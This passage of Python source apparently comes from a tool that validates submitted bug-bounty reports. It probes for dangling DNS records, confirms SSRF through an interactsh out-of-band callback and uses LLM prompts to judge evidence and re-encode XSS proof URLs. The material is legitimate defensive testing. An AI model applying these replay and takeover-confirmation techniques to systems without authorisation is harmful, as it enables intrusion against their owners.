            ns_names = [str(r.target).rstrip(".") for r in ns_answers]
            evidence_lines.append(f"NS records for {target_domain}: {', '.join(ns_names)}")
            checks_run.append("ns_lookup")

            # For each NS, check if it resolves (NXDOMAIN = dangling)
            for ns in ns_names:
                try:
                    dns.resolver.resolve(ns, "A")
                    evidence_lines.append(f"NS {ns}: resolves OK")
                except dns.exception.NXDOMAIN:
                    evidence_lines.append(f"NS {ns}: NXDOMAIN — dangling nameserver pointer!")
                    confirmed = True
                except Exception as exc:
                    evidence_lines.append(f"NS {ns}: lookup error ({exc})")

        except dns.exception.NXDOMAIN:
            evidence_lines.append(f"{target_domain}: NXDOMAIN on NS lookup")
            confirmed = True
        except dns.exception.NoAnswer:
            evidence_lines.append(f"{target_domain}: no NS records found")
        except Exception as exc:
            evidence_lines.append(f"NS lookup error: {exc}")

        # Check CNAME chain
        try:
            cname_answers = dns.resolver.resolve(target_domain, "CNAME")
            for r in cname_answers:
                target = str(r.target).rstrip(".")
                evidence_lines.append(f"CNAME: {target_domain} → {target}")
                try:
                    dns.resolver.resolve(target, "A")
                    evidence_lines.append(f"CNAME target {target}: resolves OK")
                except dns.exception.NXDOMAIN:
                    evidence_lines.append(f"CNAME target {target}: NXDOMAIN — dangling CNAME!")
                    confirmed = True
        except dns.exception.NoAnswer:
            pass
        except Exception:
            pass

    else:
        # Fallback: subprocess dig
        import subprocess
        checks_run.append("dig_fallback")
        try:
            # Sanitise domain: only allow label chars + dots; no @, spaces, or shell metacharacters
            _safe_domain = re.sub(r'[^a-zA-Z0-9.\-]', '', target_domain)[:253]
            if not _safe_domain or not re.match(r'^[a-zA-Z0-9].*\.[a-zA-Z]{2,}$', _safe_domain):
                evidence_lines.append(f"Skipped dig: invalid domain {target_domain!r}")
                raise ValueError("unsafe domain")
            result = subprocess.run(
                ["dig", _safe_domain, "NS", "+short"],
                capture_output=True, text=True, timeout=10,
            )
            ns_output = result.stdout.strip()
            evidence_lines.append(f"dig NS {target_domain}:\n{ns_output or '(no output)'}")
            if not ns_output or "SERVFAIL" in result.stderr:
                evidence_lines.append("SERVFAIL or no NS records — possible dangling pointer")
                confirmed = True
        except Exception as exc:
            evidence_lines.append(f"dig error: {exc}")

    # LLM verdict on collected evidence — requires ≥95% confidence
    checks_run.append("llm_verdict")
    llm_verdict = await _llm_dns_verdict(report, target_domain, "\n".join(evidence_lines))
    llm_confirmed, llm_label = _parse_llm_verdict(llm_verdict)
    if llm_confirmed:
        confirmed = True

    dns_findings = "\n".join(evidence_lines)
    if confirmed:
        evidence_text = (
            "CONFIRMED — dangling DNS record indicating takeover risk.\n\n"
            f"What happened:\nDNS resolution for {target_domain} shows a dangling "
            "nameserver/CNAME pointer that can be claimed by an attacker.\n\n"
            f"Risk:\nAn attacker who registers the dangling target can serve content "
            f"from {target_domain}, enabling subdomain takeover (phishing, cookie "
            "theft, bypassing domain-based trust).\n\n"
            f"DNS evidence:\n{dns_findings}"
        )
        if llm_label:
            evidence_text += f"\n\nLLM verdict: {llm_label}"
    else:
        evidence_text = evidence.build_inconclusive(
            vuln_type="dns_takeover", proof_url=report.proof_url, payload="",
            reason=(
                f"DNS resolution for {target_domain} did not unambiguously show a claimable "
                "dangling record. Confirm manually before reporting."
            ),
            observed=dns_findings,
            llm_advisory=llm_label,
            extra_suggestions=[
                f"dig NS {target_domain} +short  (look for SERVFAIL / NXDOMAIN)",
                f"dig CNAME {target_domain} +short  (check if the target still resolves)",
                "Try to claim the dangling target on its provider to prove takeover.",
            ],
        )

    return ValidationResult(
        job_id=job_id,
        status="confirmed" if confirmed else "needs_manual",
        vuln_type="dns_takeover", proof_url=report.proof_url, payload="",
        evidence=evidence_text,
        checks_run=checks_run,
        duration_ms=int((time.monotonic() - t0) * 1000),
    )


def _extract_domain(report: H1Report) -> str:
    """Try to extract the target domain from the report."""
    _domain_re = re.compile(r'\b([a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?(?:\.[a-z0-9\-]+)+)\b', re.IGNORECASE)
    # From proof_url first
    if report.proof_url:
        try:
            netloc = urlparse(report.proof_url).netloc
            if netloc:
                return netloc
        except Exception:
            pass
        # May be a bare domain (no scheme)
        if "." in report.proof_url and not report.proof_url.startswith("http"):
            return report.proof_url.split("/")[0]
    # From all_urls (may include bare domains added by the parser)
    for url in report.all_urls:
        if url.startswith("http"):
            try:
                netloc = urlparse(url).netloc
                if netloc:
                    return netloc
            except Exception:
                pass
        elif "." in url and len(url) > 4:
            # Bare domain from dig-pattern extraction
            return url
    # From target_url
    if report.target_url:
        if report.target_url.startswith("http"):
            try:
                return urlparse(report.target_url).netloc
            except Exception:
                pass
        else:
            return report.target_url
    # Raw text scan — "dig X" / "nslookup X"
    _dig_re = re.compile(r'(?:dig|nslookup|check|test)\s+([a-z0-9][a-z0-9\-\.]{3,60}\.[a-z]{2,})', re.IGNORECASE)
    for m in _dig_re.finditer(report.raw_text):
        return m.group(1).strip(".")
    return ""


# ── SSRF / OOB validation via interactsh ─────────────────────────────────────
#
# interactsh is an open-source OOB interaction server by ProjectDiscovery.
# It provides a public HTTP API to register a unique subdomain and poll for
# callbacks — no local listener, no ngrok, no AWS infra needed.
# API docs: https://github.com/projectdiscovery/interactsh
#
_INTERACTSH_SERVER = "oast.pro"
_INTERACTSH_API    = "https://oast.pro"

_SYSTEM_SSRF_ASSESS = """\
You are a senior application security engineer reviewing a HackerOne SSRF report.

The automatic OOB callback test did not receive a hit (interactsh unavailable or
target did not call back). Assess the report on its own merits:

1. Is the root cause technically credible? (sanitisation missing, code path clear?)
2. Is the researcher's original OOB evidence convincing? (callback shown, token leaked?)
3. Is the impact realistic?

Respond in this exact format:
Verdict: <Confirmed|Not confirmed|Needs manual review>
Confidence: <0-100>%
Reasoning: <2-3 sentences of specific technical evidence>
"""


class _InteractshSession:
    """Thin async wrapper around the interactsh HTTP API."""

    def __init__(self, server: str = _INTERACTSH_API) -> None:
        self._server = server.rstrip("/")
        self._correlation_id: str = ""
        self._secret_key: str = ""
        self._domain: str = ""

    async def register(self) -> bool:
        """Register a new interaction subdomain. Returns True on success."""
        try:
            import httpx, secrets as _sec
            self._secret_key = _sec.token_hex(16)
            correlation_id = _sec.token_hex(10)  # 20 hex chars
            self._correlation_id = correlation_id

            payload = {
                "public-key": self._secret_key,
                "secret-key": self._secret_key,
                "correlation-id": correlation_id,
            }
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                r = await client.post(f"{self._server}/register", json=payload)
                if r.status_code == 200:
                    data = r.json()
                    self._domain = data.get("domain", "")
                    return bool(self._domain)
        except Exception:
            pass
        return False

    @property
    def url(self) -> str:
        """Returns the unique OOB URL to use as SSRF payload."""
        if not self._domain:
            return ""
        return f"http://{self._correlation_id}.{self._domain}"

    async def poll(self) -> bool:
        """Poll for interactions. Returns True if any callback was received."""
        try:
            import httpx
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                r = await client.get(
                    f"{self._server}/poll",
                    params={
                        "id": self._correlation_id,
                        "secret": self._secret_key,
                    },
                )
                if r.status_code == 200:
                    data = r.json()
                    interactions = data.get("data") or []
                    return len(interactions) > 0
        except Exception:
            pass
        return False

    async def deregister(self) -> None:
        try:
            import httpx
            async with httpx.AsyncClient(timeout=5, verify=False) as client:
                await client.post(
                    f"{self._server}/deregister",
                    json={"correlation-id": self._correlation_id, "secret-key": self._secret_key},
                )
        except Exception:
            pass


async def _validate_ssrf(
    report: H1Report,
    proxy_port: int = 8080,
) -> ValidationResult:
    """
    SSRF validation using interactsh as the public OOB server.

    Flow:
    1. Register a unique subdomain on interactsh (oast.pro) — publicly reachable.
    2. Show the user the OOB URL and instruct them to re-trigger the SSRF.
    3. Poll for 120s. If interactsh receives an HTTP/DNS callback → confirmed.
    4. If interactsh is unreachable or no callback → needs_manual with LLM
       credibility assessment and manual reproduction steps.
    """
    job_id = str(uuid.uuid4())[:8]
    t0 = time.monotonic()
    checks_run: List[str] = []
    from dast.ai.payload_generator import _sanitize_for_prompt
    from dast.ai import bedrock_client

    # ── 1. Register interactsh session ───────────────────────────────────────
    session = _InteractshSession()
    registered = await session.register()
    checks_run.append("interactsh_register" if registered else "interactsh_unavailable")

    oob_url = session.url if registered else ""
    original_payload = report.payload or "(see report for injection point)"

    if registered:
        instructions = (
            f"OOB URL (interactsh): {oob_url}\n\n"
            f"Steps to confirm:\n"
            f"1. Re-trigger the SSRF using this URL as the callback:\n"
            f"   {oob_url}\n"
            f"2. Original payload for reference:\n"
            f"   {original_payload}\n"
            f"3. Validator is polling for 120s — auto-confirms if hit received"
        )
    else:
        instructions = (
            f"interactsh (oast.pro) is not reachable from this machine.\n\n"
            f"To confirm manually:\n"
            f"1. Use https://app.interactsh.com to get an OOB URL\n"
            f"2. Re-trigger the SSRF with that URL as the callback\n"
            f"3. Original payload for reference:\n"
            f"   {original_payload}"
        )

    # ── 2. Poll for callback ─────────────────────────────────────────────────
    callback_received = False
    if registered:
        checks_run.append("oob_polling")
        for _ in range(24):  # 24 × 5s = 120s
            await asyncio.sleep(5)
            if await session.poll():
                callback_received = True
                break
        await session.deregister()

    if callback_received:
        checks_run.append("oob_callback_received")
        return ValidationResult(
            job_id=job_id, status="confirmed",
            vuln_type="ssrf", proof_url=report.proof_url, payload=report.payload,
            evidence=f"OOB callback received on {oob_url} via interactsh — SSRF confirmed.",
            checks_run=checks_run,
            duration_ms=int((time.monotonic() - t0) * 1000),
        )

    # ── 3. No callback — LLM credibility assessment ──────────────────────────
    checks_run.append("llm_credibility_assessment")
    try:
        user = f"Full report (first 4000 chars):\n{_sanitize_for_prompt(report.raw_text, 4000)}\n"
        loop = asyncio.get_running_loop()
        assessment = await loop.run_in_executor(
            None,
            lambda: bedrock_client.invoke(
                system=_SYSTEM_SSRF_ASSESS, user=user,
                model_id=bedrock_client.get_validation_model(),
                max_tokens=400,
            ),
        )
    except Exception as exc:
        assessment = f"LLM assessment failed: {str(exc)[:150]}"

    reason = "No OOB callback received" if registered else "interactsh unreachable"
    evidence = (
        f"{reason}.\n\n"
        f"LLM credibility assessment:\n{assessment}\n\n"
        f"Manual confirmation steps:\n{instructions}"
    )
    return ValidationResult(
        job_id=job_id, status="needs_manual",
        vuln_type="ssrf", proof_url=report.proof_url, payload=report.payload,
        evidence=evidence,
        checks_run=checks_run,
        duration_ms=int((time.monotonic() - t0) * 1000),
    )


# ── LLM helpers ──────────────────────────────────────────────────────────────

_SYSTEM_ANALYSE = """\
You are a security researcher validating a reported vulnerability.
Given the original report and the HTTP response received when accessing the proof URL,
determine whether the vulnerability is confirmed.

Be conservative — only say Confirmed if you are at least 95% certain based on
clear, unambiguous evidence (e.g. payload executing, error pattern matching,
redirect to attacker-controlled host with exact payload reflected).
"Looks suspicious" or "might be vulnerable" is NOT enough.

Respond in this exact format:
Verdict: <Confirmed|Not confirmed|Needs manual review>
Confidence: <0-100>%
Reasoning: <one sentence of specific evidence>
"""

_SYSTEM_DNS = """\
You are a DNS security expert validating a DNS takeover report.
Given DNS resolution results, determine if there is a real dangling record.

Only say Confirmed if NS/CNAME resolution unambiguously shows NXDOMAIN on a
nameserver that can be registered — 95% confidence minimum required.

Respond in this exact format:
Verdict: <Confirmed|Not confirmed|Needs manual review>
Confidence: <0-100>%
Reasoning: <one sentence of specific evidence>
"""

_SYSTEM_URL_REPAIR = """\
You repair a proof-of-concept URL so a browser will drive the payload the
reporter intended. You do NOT judge whether the vulnerability is real — a
browser will execute your URL and decide. Your only job is to output the exact,
correctly-encoded URL to load.

Common issues to fix:
- Percent-encoding lost in copy/paste (e.g. '+' in a javascript: payload must be
  %2b, otherwise the browser decodes it to a space and breaks the JS).
- HTML entities that leaked in (&amp; -> &, &#x27; -> ').
- A payload the report describes in prose that belongs in a specific parameter.

Rules:
- Keep the SAME scheme, host and path as the given proof URL. Never change the
  target host. Never invent a new destination.
- Output ONLY the repaired URL on a single line, nothing else.
- If the URL is already correct or you cannot improve it, output it unchanged.
"""


def _parse_llm_verdict(text: str, confidence_threshold: int = 95) -> tuple[bool, str]:
    """
    Parse structured LLM verdict and apply confidence threshold.
    Returns (confirmed: bool, reasoning: str).
    Only returns confirmed=True if Verdict==Confirmed AND Confidence >= threshold.
    """
    import re as _re
    verdict_m = _re.search(r'Verdict:\s*(Confirmed|Not confirmed|Needs manual review)', text, _re.IGNORECASE)
    conf_m = _re.search(r'Confidence:\s*(\d+)', text)
    reasoning_m = _re.search(r'Reasoning:\s*(.+)', text)

    verdict = verdict_m.group(1).lower() if verdict_m else ""
    confidence = int(conf_m.group(1)) if conf_m else 0
    reasoning = reasoning_m.group(1).strip() if reasoning_m else text.strip()

    confirmed = verdict == "confirmed" and confidence >= confidence_threshold
    label = f"[{confidence}% confidence] {reasoning}"
    return confirmed, label


async def _llm_verdict_http(
    report: H1Report, body: str, status_code: int, confidence_threshold: float = 0.95
) -> tuple[bool, str, str]:
    """Schema-forced reproduction verdict for the generic HTTP path.

    Returns (reproduced, label, severity). Unlike the free-text
    ``_parse_llm_verdict`` regex path, the model is forced through
    H1_VERDICT_SCHEMA so the verdict is always a valid, typed object. Degrades to
    (False, "", "") on any LLM failure.
    """
    try:
        from dast.ai import bedrock_client
        from dast.ai.payload_generator import _sanitize_for_prompt
        from dast.ai.prompt_safety import UNTRUSTED_CONTENT_DIRECTIVE, wrap_untrusted
        from dast.ai.schemas import H1_VERDICT_SCHEMA

        user = (
            f"Vuln type: {report.vuln_type}\n"
            f"Proof URL: {_sanitize_for_prompt(report.proof_url, 300)}\n"
            f"Method: {report.http_method}\n"
            f"Payload: {_sanitize_for_prompt(report.payload, 200)}\n"
            f"Report summary: {_sanitize_for_prompt(report.summary or report.raw_text[:400], 400)}\n\n"
            f"HTTP response status: {status_code}\n"
            "Response body:\n"
            + wrap_untrusted(body[:2000], "http_response")
        )
        loop = asyncio.get_running_loop()
        result = await loop.run_in_executor(
            None,
            lambda: bedrock_client.invoke_json(
                system=_SYSTEM_ANALYSE + "\n\n" + UNTRUSTED_CONTENT_DIRECTIVE,
                user=user,
                model_id=bedrock_client.get_fast_model(),
                max_tokens=384, temperature=0,
                schema=H1_VERDICT_SCHEMA,
            ),
        )
        reproduced = bool(result.get("reproduced"))
        confidence = float(result.get("confidence", 0.0) or 0.0)
        severity = str(result.get("severity", "info"))
        reasoning = str(result.get("reasoning", "")).strip()
        confirmed = reproduced and confidence >= confidence_threshold
        label = f"[{int(confidence * 100)}% confidence, {severity}] {reasoning}"
        return confirmed, label, severity
    except Exception as exc:
        logger.debug("H1 schema verdict failed", error=str(exc))
        return False, "", ""


async def _llm_analyse_response(report: H1Report, body: str, status_code: int) -> str:
    try:
        from dast.ai import bedrock_client
        from dast.ai.payload_generator import _sanitize_for_prompt
        user = (
            f"Vuln type: {report.vuln_type}\n"
            f"Proof URL: {_sanitize_for_prompt(report.proof_url, 300)}\n"
            f"Payload: {_sanitize_for_prompt(report.payload, 200)}\n"
            f"Report summary: {_sanitize_for_prompt(report.summary or report.raw_text[:500], 500)}\n\n"
            f"HTTP response status: {status_code}\n"
            f"Response body (first 2000 chars):\n{_sanitize_for_prompt(body, 2000)}\n"
        )
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            None,
            lambda: bedrock_client.invoke(
                system=_SYSTEM_ANALYSE, user=user,
                model_id=bedrock_client.get_fast_model(),
                max_tokens=256,
            ),
        )
    except Exception as exc:
        logger.debug("H1 LLM analysis failed", error=str(exc))
        return ""


async def _llm_repair_proof_url(report: H1Report, proof_url: str, page_content: str) -> str:
    """
    Ask the LLM to reinterpret/re-encode the intended proof URL when the browser
    observed no execution. The LLM only proposes a corrected INPUT URL — the
    browser still has to execute it to confirm; the LLM never sets the verdict.

    Returns the repaired URL (same scheme+host+path enforced by the caller via
    _is_safe_url), or "" on failure / no useful change.
    """
    try:
        from dast.ai import bedrock_client
        from dast.ai.payload_generator import _sanitize_for_prompt
        from urllib.parse import urlparse as _up
        user = (
            f"Proof URL as received:\n{_sanitize_for_prompt(proof_url, 500)}\n\n"
            f"Reported payload / notes:\n{_sanitize_for_prompt(report.payload or '', 300)}\n\n"
            f"Report text (first 800 chars):\n{_sanitize_for_prompt(report.raw_text[:800], 800)}\n\n"
            "Loading the URL above triggered no JavaScript execution in the browser. "
            "Output the corrected URL to load (same scheme/host/path)."
        )
        loop = asyncio.get_running_loop()
        raw = await loop.run_in_executor(
            None,
            lambda: bedrock_client.invoke(
                system=_SYSTEM_URL_REPAIR, user=user,
                model_id=bedrock_client.get_fast_model(),
                max_tokens=400, temperature=0,
            ),
        )
        candidate = (raw or "").strip().splitlines()[0].strip() if raw else ""
        if not candidate.lower().startswith(("http://", "https://")):
            return ""
        # Enforce same host as the original proof URL — the LLM must not redirect
        # us to a different target it hallucinated.
        if _up(candidate).netloc.lower() != _up(proof_url).netloc.lower():
            logger.warning("LLM URL repair changed the host; rejecting")
            return ""
        return candidate
    except Exception as exc:
        logger.debug("H1 LLM URL repair failed", error=str(exc))
        return ""


async def _llm_dns_verdict(report: H1Report, domain: str, dns_evidence: str) -> str:
    try:
        from dast.ai import bedrock_client
        from dast.ai.payload_generator import _sanitize_for_prompt
        user = (
            f"Target domain: {domain}\n\n"
            f"DNS evidence:\n{_sanitize_for_prompt(dns_evidence, 1500)}\n\n"
            f"Original report (first 800 chars):\n{_sanitize_for_prompt(report.raw_text, 800)}\n"
        )
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            None,
            lambda: bedrock_client.invoke(
                system=_SYSTEM_DNS, user=user,
                model_id=bedrock_client.get_fast_model(),
                max_tokens=256,
            ),
        )
    except Exception as exc:
        logger.debug("H1 DNS LLM verdict failed", error=str(exc))
        return ""


# ── Main dispatcher ───────────────────────────────────────────────────────────

async def validate(
    report: H1Report,
    proxy_port: int = 8080,
    cookies: Optional[Dict[str, str]] = None,
) -> ValidationResult:
    """
    Route the report to the appropriate validator based on vuln_type.
    cookies: dict of session cookies collected from a browser session.
    """
    vt = report.vuln_type

    if vt == "xss":
        return await _validate_xss(report, proxy_port, cookies=cookies)
    elif vt == "dns_takeover":
        return await _validate_dns_takeover(report)
    elif vt == "ssrf":
        # SSRF requires an OOB callback. Uses interactsh (oast.pro) as the
        # public callback server — no local listener, no ngrok needed.
        return await _validate_ssrf(report, proxy_port=proxy_port)
    elif vt in ("sqli", "ssti", "open_redirect", "lfi", "idor",
                "csrf", "auth_bypass", "info_disclosure", "business_logic",
                "privilege_escalation", "rce", "xxe", "other", "unknown"):
        return await _validate_http(report, proxy_port, cookies=cookies)
    else:
        return await _validate_http(report, proxy_port, cookies=cookies)
